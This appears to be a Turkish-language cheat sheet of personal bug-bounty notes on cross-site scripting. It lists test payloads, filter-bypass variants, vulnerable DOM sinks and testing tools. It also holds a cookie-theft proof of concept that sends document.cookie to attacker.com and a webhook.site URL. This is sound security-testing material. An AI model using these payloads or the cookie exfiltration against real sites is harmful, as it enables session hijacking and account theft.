**XSS (Cross-Site Scripting)**



Kullanıcı girdisinin sayfaya temizlenmeden (sanitize edilmeden) yansıtılması sonucu, tarayıcıda istemci taraflı JavaScript çalıştırılabilmesidir.



**Türleri;**



Reflected Girdi anlık olarak response'a yansır (URL parametresi vb.)

StoredGirdi veritabanına kaydedilir, her görüntülemede çalışır

DOM-basedSunucuya gitmez, client-side JS DOM'u güvensiz işler



**Temel Test Payload'ları**



* html<script>alert(1)</script>
* "<img src=x onerror=alert(1)>"
* "<svg onload=alert(1)>"
* "><script>alert(document.domain)</script>
* javascript:alert(1)



**Filtre Atlatma Payload'ları**



* html<!-- Tag/attribute filtreleme atlatma -->
* <ScRiPt>alert(1)</sCriPt>
* <img/src="x"/onerror="alert(1)">
* <svg/onload=alert(1)>
* <details open ontoggle=alert(1)>
* <body onload=alert(1)>
* <iframe src="javascript:alert(1)">
* <!-- Event handler tabanlı, tag gerekmeyen -->" autofocus onfocus=alert(1) x="
* <!-- Encode edilmiş -->%3Cscript%3Ealert(1)%3C%2Fscript%3E
* \&#60;script\&#62;alert(1)\&#60;/script\&#62;



**DOM XSS — Tipik Zafiyetli Sink'ler**



javascript// innerHTML, document.write, eval gibi fonksiyonlar tehlikeli sink'lerdir

document.getElementById("output").innerHTML = location.hash.substring(1);

// URL: site.com/page#<img src=x onerror=alert(1)>



eval(decodeURIComponent(location.search.split('=')\[1]));

// URL: site.com/page?q=alert(1)



**Cookie / Session Çalma PoC**



html<script>

fetch('https://attacker.com/log?c=' + document.cookie)

</script>



<!-- Bug bounty raporunda etki kanıtlamak için kullanılır -->

<img src=x onerror="fetch('https://webhook.site/UNIQUE\_ID?cookie='+document.cookie)">



**Test Araçları**





*Burp Suite (Repeater + Intruder)*

*PortSwigger XSS Cheat Sheet*

*XSStrike, Dalfox (otomatik tarama)*





**Tespit Stratejisi**



Tüm input noktalarını işaretlemekten başladım (URL param, form, header, cookie, JSON body)

Benzersiz bir string gönderdim örneğin (zzXSSzz123) ve response'ta nerede yansıdığını buldum

Yansıma context'ine göre payload seçmem daha kolaylaşıyor. (HTML body / attribute / JS string / URL)



